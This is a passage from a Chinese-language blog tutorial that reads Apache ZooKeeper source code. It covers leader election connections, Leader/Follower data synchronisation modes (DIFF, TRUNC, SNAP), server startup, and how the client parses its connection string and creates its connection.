dout.flush();</span><br><span class="line">        <span class="comment">// 通过输入流读取对方发送过来的选票</span></span><br><span class="line">        din = <span class="keyword">new</span> DataInputStream(</span><br><span class="line">                <span class="keyword">new</span> BufferedInputStream(sock.getInputStream()));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        LOG.warn(<span class="string">"Ignoring exception reading or writing challenge: "</span>, e);</span><br><span class="line">        closeSocket(sock);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// authenticate learner</span></span><br><span class="line">    QuorumPeer.QuorumServer qps = self.getVotingView().get(sid);</span><br><span class="line">    <span class="keyword">if</span> (qps != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// TODO - investigate why reconfig makes qps null.</span></span><br><span class="line">        authLearner.authenticate(sock, qps.hostname);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果对方的 id 比我的大，我是没有资格给对方发送连接请求的，直接关闭自己的客户端</span></span><br><span class="line">    <span class="keyword">if</span> (sid &gt; self.getId()) &#123;</span><br><span class="line">        LOG.info(<span class="string">"Have smaller server identifier, so dropping the "</span> +</span><br><span class="line">                <span class="string">"connection: ("</span> + sid + <span class="string">", "</span> + self.getId() + <span class="string">")"</span>);</span><br><span class="line">        closeSocket(sock);</span><br><span class="line">        <span class="comment">// Otherwise proceed with the connection</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 初始化，发送器 和 接收器</span></span><br><span class="line">        SendWorker sw = <span class="keyword">new</span> SendWorker(sock, sid);</span><br><span class="line">        RecvWorker rw = <span class="keyword">new</span> RecvWorker(sock, din, sid, sw);</span><br><span class="line">        sw.setRecv(rw);</span><br><span class="line"></span><br><span class="line">        SendWorker vsw = senderWorkerMap.get(sid);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(vsw != <span class="keyword">null</span>)</span><br><span class="line">            vsw.finish();</span><br><span class="line"></span><br><span class="line">        senderWorkerMap.put(sid, sw);</span><br><span class="line">        queueSendMap.putIfAbsent(sid, <span class="keyword">new</span> ArrayBlockingQueue&lt;ByteBuffer&gt;(</span><br><span class="line">                SEND_CAPACITY));</span><br><span class="line">        <span class="comment">// 启动发送器线程和接收器线程</span></span><br><span class="line">        sw.start();</span><br><span class="line">        rw.start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>点击 SendWorker，并查找该类下的 run 方法；点击 RecvWorker，并查找该类下的 run 方法(这里不举例了)，在 FastLeaderElection.java 类中查找 WorkerReceiver 线程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">     Message response;</span><br><span class="line">     <span class="keyword">while</span> (!stop) &#123;</span><br><span class="line">         <span class="comment">// Sleeps on receive</span></span><br><span class="line">         <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 从 RecvQueue 中取出选举投票消息（其他服务器发送过来的）</span></span><br><span class="line">             response = manager.pollRecvQueue(<span class="number">3000</span>, TimeUnit.MILLISECONDS);</span><br><span class="line">             ......</span><br><span class="line">         &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">         ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5、Follower-和-Leader-状态同步源码">5、Follower 和 Leader 状态同步源码</h2><p>当选举结束后，每个节点都需要根据自己的角色更新自己的状态。选举出的 Leader 更新自己状态为Leader，其他节点更新自己状态为 Follower。Leader 更新状态入口：<code>leader.lead()</code>；Follower 更新状态入口：<code>follower.followerLeader()</code> 注意：</p><ul><li>follower 必须要让 leader 知道自己的状态：epoch、zxid、sid 必须要找出谁是leader；发起请求连接 leader；发送自己的信息给leader；leader 接收到信息，必须要返回对应的信息给 follower</li><li>当leader 得知follower 的状态了，就确定需要做何种方式的数据同步DIFF、TRUNC、SNAP</li><li>执行数据同步</li><li>当 leader 接收到超过半数 follower 的 ack 之后，进入正常工作状态，集群启动完成了</li></ul><p>最终总结同步的方式：</p><ul><li>DIFF 咱两一样，不需要做什么</li><li>TRUNC follower 的 zxid 比 leader 的 zxid 大，所以 Follower 要回滚</li><li>COMMIT leader 的zxid 比 follower 的 zxid 大，发送 Proposal 给 foloower 提交执行</li><li>如果 follower 并没有任何数据，直接使用 SNAP 的方式来执行数据同步（直接把数据全部序列到follower）</li></ul><p><img src="http://qnypic.shawncoding.top/blog/202402291817159.png" alt></p><h2 id="6、服务端启动">6、服务端启动</h2><h3 id="6-1-Leader-启动">6.1  Leader 启动</h3><p><img src="http://qnypic.shawncoding.top/blog/202402291817160.png" alt></p><p>ZooKeeperServer全局查找 Leader，然后 ctrl + f 查找 lead()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">lead</span><span class="params">()</span> <span class="keyword">throws</span> IOException, InterruptedException </span>&#123;</span><br><span class="line">    ... ...</span><br><span class="line">    <span class="comment">// 启动 zookeeper 服务</span></span><br><span class="line">     startZkServer();</span><br><span class="line">    ... ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">startZkServer</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="comment">// 启动 zookeeper 服务</span></span><br><span class="line">    zk.startup();</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//LeaderZooKeeperServer.java-&gt;super.startup();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ZookeeperServer.java</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">startup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (sessionTracker == <span class="keyword">null</span>) &#123;</span><br><span class="line">        createSessionTracker();</span><br><span class="line">    &#125;</span><br><span class="line">    startSessionTracker();</span><br><span class="line">    <span class="comment">// 接受请求相关处理</span></span><br><span class="line">    setupRequestProcessors();</span><br><span class="line"></span><br><span class="line">    registerJMX();</span><br><span class="line"></span><br><span class="line">    setState(State.RUNNING);</span><br><span class="line">    notifyAll();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">setupRequestProcessors</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    RequestProcessor finalProcessor = <span class="keyword">new</span> FinalRequestProcessor(<span class="keyword">this</span>);</span><br><span class="line">    RequestProcessor syncProcessor = <span class="keyword">new</span> SyncRequestProcessor(<span class="keyword">this</span>,</span><br><span class="line">            finalProcessor);</span><br><span class="line">    ((SyncRequestProcessor)syncProcessor).start();</span><br><span class="line">    firstProcessor = <span class="keyword">new</span> PrepRequestProcessor(<span class="keyword">this</span>, syncProcessor);</span><br><span class="line">    ((PrepRequestProcessor)firstProcessor).start();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//点击 PrepRequestProcessor，并查找它的 run 方法</span></span><br></pre></td></tr></table></figure><h3 id="6-2-Follower-启动">6.2 Follower 启动</h3><p><img src="http://qnypic.shawncoding.top/blog/202402291817161.png" alt></p><p>FollowerZooKeeperServer全局查找 Follower，然后 ctrl + f 查找 followLeader()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">followLeader</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">......</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">this</span>.isRunning()) &#123;</span><br><span class="line">            readPacket(qp);</span><br><span class="line">            processPacket(qp);</span><br><span class="line">        &#125;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">readPacket</span><span class="params">(QuorumPacket pp)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">synchronized</span> (leaderIs) &#123;</span><br><span class="line">        leaderIs.readRecord(pp, <span class="string">"packet"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (LOG.isTraceEnabled()) &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">long</span> traceMask =</span><br><span class="line">            (pp.getType() == Leader.PING) ? ZooTrace.SERVER_PING_TRACE_MASK</span><br><span class="line">                : ZooTrace.SERVER_PACKET_TRACE_MASK;</span><br><span class="line"></span><br><span class="line">        ZooTrace.logQuorumPacket(LOG, traceMask, <span class="string">'i'</span>, pp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">processPacket</span><span class="params">(QuorumPacket qp)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (qp.getType()) &#123;</span><br><span class="line">    <span class="keyword">case</span> Leader.PING:            </span><br><span class="line">        ping(qp);            </span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> Leader.PROPOSAL:           </span><br><span class="line">        TxnHeader hdr = <span class="keyword">new</span> TxnHeader();</span><br><span class="line">        Record txn = SerializeUtils.deserializeTxn(qp.getData(), hdr);</span><br><span class="line">        <span class="keyword">if</span> (hdr.getZxid() != lastQueued + <span class="number">1</span>) &#123;</span><br><span class="line">            LOG.warn(<span class="string">"Got zxid 0x"</span></span><br><span class="line">                    + Long.toHexString(hdr.getZxid())</span><br><span class="line">                    + <span class="string">" expected 0x"</span></span><br><span class="line">                    + Long.toHexString(lastQueued + <span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        lastQueued = hdr.getZxid();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (hdr.getType() == OpCode.reconfig)&#123;</span><br><span class="line">           SetDataTxn setDataTxn = (SetDataTxn) txn;       </span><br><span class="line">           QuorumVerifier qv = self.configFromString(<span class="keyword">new</span> String(setDataTxn.getData()));</span><br><span class="line">           self.setLastSeenQuorumVerifier(qv, <span class="keyword">true</span>);                               </span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        fzk.logRequest(hdr, txn);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> Leader.COMMIT:</span><br><span class="line">        fzk.commit(qp.getZxid());</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">case</span> Leader.COMMITANDACTIVATE:</span><br><span class="line">       <span class="comment">// get the new configuration from the request</span></span><br><span class="line">       Request request = fzk.pendingTxns.element();</span><br><span class="line">       SetDataTxn setDataTxn = (SetDataTxn) request.getTxn();                                                                                                      </span><br><span class="line">       QuorumVerifier qv = self.configFromString(<span class="keyword">new</span> String(setDataTxn.getData()));                                </span><br><span class="line">       <span class="comment">// get new designated leader from (current) leader's message</span></span><br><span class="line">       ByteBuffer buffer = ByteBuffer.wrap(qp.getData());    </span><br><span class="line">       <span class="keyword">long</span> suggestedLeaderId = buffer.getLong();</span><br><span class="line">        <span class="keyword">boolean</span> majorChange = </span><br><span class="line">               self.processReconfig(qv, suggestedLeaderId, qp.getZxid(), <span class="keyword">true</span>);</span><br><span class="line">       <span class="comment">// commit (writes the new config to ZK tree (/zookeeper/config)                     </span></span><br><span class="line">       fzk.commit(qp.getZxid());</span><br><span class="line">        <span class="keyword">if</span> (majorChange) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"changes proposed in reconfig"</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> Leader.UPTODATE:</span><br><span class="line">        LOG.error(<span class="string">"Received an UPTODATE message after Follower started"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> Leader.REVALIDATE:</span><br><span class="line">        revalidate(qp);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> Leader.SYNC:</span><br><span class="line">        fzk.sync();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        LOG.warn(<span class="string">"Unknown packet type: &#123;&#125;"</span>, LearnerHandler.packetToString(qp));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="7、客户端启动">7、客户端启动</h2><p><img src="http://qnypic.shawncoding.top/blog/202402291817162.png" alt></p><p>在 <a href="http://ZkCli.sh" target="_blank" rel="noopener">ZkCli.sh</a> 启动 Zookeeper 时，会调用 ZooKeeperMain.java，查找 ZooKeeperMain，找到程序的入口 main()方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> CliException, IOException, InterruptedException</span>&#123;</span><br><span class="line">    ZooKeeperMain main = <span class="keyword">new</span> ZooKeeperMain(args);</span><br><span class="line">    main.run();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-1-创建-ZookeeperMain">7.1 创建 ZookeeperMain</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ZooKeeperMain</span><span class="params">(String args[])</span> <span class="keyword">throws</span> IOException, InterruptedException </span>&#123;</span><br><span class="line">    cl.parseOptions(args);</span><br><span class="line">    System.out.println(<span class="string">"Connecting to "</span> + cl.getOption(<span class="string">"server"</span>));</span><br><span class="line">    connectToZK(cl.getOption(<span class="string">"server"</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">connectToZK</span><span class="params">(String newHost)</span> <span class="keyword">throws</span> InterruptedException, IOException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (zk != <span class="keyword">null</span> &amp;&amp; zk.getState().isAlive()) &#123;</span><br><span class="line">        zk.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    host = newHost;</span><br><span class="line">    <span class="keyword">boolean</span> readOnly = cl.getOption(<span class="string">"readonly"</span>) != <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (cl.getOption(<span class="string">"secure"</span>) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        System.setProperty(ZKClientConfig.SECURE_CLIENT, <span class="string">"true"</span>);</span><br><span class="line">        System.out.println(<span class="string">"Secure connection is enabled"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    zk = <span class="keyword">new</span> ZooKeeperAdmin(host, Integer.parseInt(cl.getOption(<span class="string">"timeout"</span>)), <span class="keyword">new</span> MyWatcher(), readOnly);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-2-初始化监听器">7.2 初始化监听器</h3><p>ZooKeeperAdmin一直点进去</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ZooKeeper</span><span class="params">(String connectString, <span class="keyword">int</span> sessionTimeout, Watcher watcher,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">boolean</span> canBeReadOnly, HostProvider aHostProvider,</span></span></span><br><span class="line"><span class="function"><span class="params">        ZKClientConfig clientConfig)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    LOG.info(<span class="string">"Initiating client connection, connectString="</span> + connectString</span><br><span class="line">            + <span class="string">" sessionTimeout="</span> + sessionTimeout + <span class="string">" watcher="</span> + watcher);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clientConfig == <span class="keyword">null</span>) &#123;</span><br><span class="line">        clientConfig = <span class="keyword">new</span> ZKClientConfig();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.clientConfig = clientConfig;</span><br><span class="line">    watchManager = defaultWatchManager();</span><br><span class="line">    <span class="comment">// 赋值 watcher 给默认的 defaultWatcher</span></span><br><span class="line">    watchManager.defaultWatcher = watcher;</span><br><span class="line">    ConnectStringParser connectStringParser = <span class="keyword">new</span> ConnectStringParser(</span><br><span class="line">            connectString);</span><br><span class="line">    hostProvider = aHostProvider;</span><br><span class="line">    <span class="comment">// 客户端与服务器端通信的终端</span></span><br><span class="line">    cnxn = createConnection(connectStringParser.getChrootPath(),</span><br><span class="line">            hostProvider, sessionTimeout, <span class="keyword">this</span>, watchManager,</span><br><span class="line">            getClientCnxnSocket(), canBeReadOnly);</span><br><span class="line">    cnxn.start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-3-解析连接地址">7.3 解析连接地址</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ConnectStringParser</span><span class="params">(String connectString)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// parse out chroot, if any</span></span><br><span class="line">    <span class="keyword">int</span> off = connectString.indexOf(<span class="string">'/'</span>);</span><br><span class="line">    <span class="keyword">if</span> (off &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        String chrootPath = connectString.substring(off);</span><br><span class="line">        <span class="comment">// ignore "/" chroot spec, same as null</span></span><br><span class="line">        <span class="keyword">if</span> (chrootPath.length() == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.chrootPath = <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            PathUtils.validatePath(chrootPath);</span><br><span class="line">            <span class="keyword">this</span>.chrootPath = chrootPath;</span><br><span class="line">        &#125;</span><br><span class="line">        connectString = connectString.substring(<span class="number">0</span>, off);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.chrootPath = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// "hadoop102:2181,hadoop103:2181,hadoop104:2181"用逗号切割</span></span><br><span class="line">    List&lt;String&gt; hostsList = split(connectString,<span class="string">","</span>);</span><br><span class="line">    <span class="keyword">for</span> (String host : hostsList) &#123;</span><br><span class="line">        <span class="keyword">int</span> port = DEFAULT_PORT;</span><br><span class="line">        <span class="keyword">int</span> pidx = host.lastIndexOf(<span class="string">':'</span>);</span><br><span class="line">        <span class="keyword">if</span> (pidx &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// otherwise : is at the end of the string, ignore</span></span><br><span class="line">            <span class="keyword">if</span> (pidx &lt; host.length() - <span class="number">1</span>) &#123;</span><br><span class="line">                port = Integer.parseInt(host.substring(pidx + <span class="number">1</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            host = host.substring(<span class="number">0</span>, pidx);</span><br><span class="line">        &#125;</span><br><span class="line">        serverAddresses.add(InetSocketAddress.createUnresolved(host, port));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InetSocketAddress</span> <span class="keyword">extends</span> <span class="title">SocketAddress</span></span>&#123;</span><br><span class="line">    <span class="comment">// Private implementation class pointed to by all public methods.</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">InetSocketAddressHolder</span> </span>&#123;</span><br><span class="line">        <span class="comment">// The hostname of the Socket Address 主机名称</span></span><br><span class="line">        <span class="keyword">private</span> String hostname;</span><br><span class="line">        <span class="comment">// The IP address of the Socket Address 通信地址</span></span><br><span class="line">        <span class="keyword">private</span> InetAddress addr;</span><br><span class="line">        <span class="comment">// The port number of the Socket Address 端口号</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">int</span> port;</span><br><span class="line">        ... ...</span><br><span class="line">    &#125;</span><br><span class="line">    ... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-4-创建通信">7.4 创建通信</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ZooKeeper</span><span class="params">(String connectString, <span class="keyword">int</span> sessionTimeout, Watcher watcher,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">boolean</span> canBeReadOnly, HostProvider aHostProvider,</span></span></span><br><span class="line"><span class="function"><span class="params">        ZKClientConfig clientConfig)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="comment">// 客户端与服务器端通信的终端</span></span><br><span class="line">    cnxn = createConnection(connectStringParser.getChrootPath(),</span><br><span class="line">            hostProvider, sessionTimeout, <span class="keyword">this</span>, watchManager,</span><br><span class="line">            getClientCnxnSocket(), canBeReadOnly);</span><br><span class="line">    cnxn.start();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> ClientCnxn <span class="title">createConnection</span><span class="params">(String chrootPath,</span></span></span><br><span class="line"><span class="function"><span class="params">        HostProvider hostProvider, <span class="keyword">int</span> sessionTimeout, ZooKeeper zooKeeper,</span></span></span><br><span class="line"><span class="function"><span class="params">        ClientWatchManager watcher, ClientCnxnSocket clientCnxnSocket,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">boolean</span> canBeReadOnly)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> ClientCnxn(chrootPath, hostProvider, sessionTimeout, <span class="keyword">this</span>,</span><br><span class="line">            watchManager, clientCnxnSocket, canBeReadOnly);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 一直点下去，直到这里</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ClientCnxn</span><span class="params">(String chrootPath, HostProvider hostProvider, <span class="keyword">int</span> sessionTimeout, ZooKeeper zooKeeper,</span></span></span><br><span class="line"><span class="function"><span class="params">        ClientWatchManager watcher, ClientCnxnSocket clientCnxnSocket,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">long</span> sessionId, <span class="keyword">byte</span>[] sessionPasswd, <span class="keyword">boolean</span> canBeReadOnly)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.zooKeeper = zooKeeper;</span><br><span class="line">    <span class="keyword">this</span>.watcher = watcher;</span><br><span class="line">    <span class="keyword">this</span>.sessionId = sessionId;</span><br><span class="line">    <span class="keyword">this</span>.sessionPasswd = sessionPasswd;</span><br><span class="line">    <span class="keyword">this</span>.sessionTimeout = sessionTimeout;</span><br><span class="line">    <span class="keyword">this</span>.hostProvider = hostProvider;</span><br><span class="line">    <span class="keyword">this</span>.chrootPath = chrootPath;</span><br><span class="line"></span><br><span class="line">    connectTimeout = sessionTimeout / hostProvider.size();</span><br><span class="line">    readTimeout = sessionTimeout * <span class="number">2</span> / <span class="number">3</span>;</span><br><span class="line">    readOnly = canBeReadOnly;</span><br><span class="line"></span><br><span class="line">    sendThread = <span class="keyword">new</span> SendThread(clientCnxnSocket);</span><br><span class="line">    eventThread = <span class="keyword">new</span> 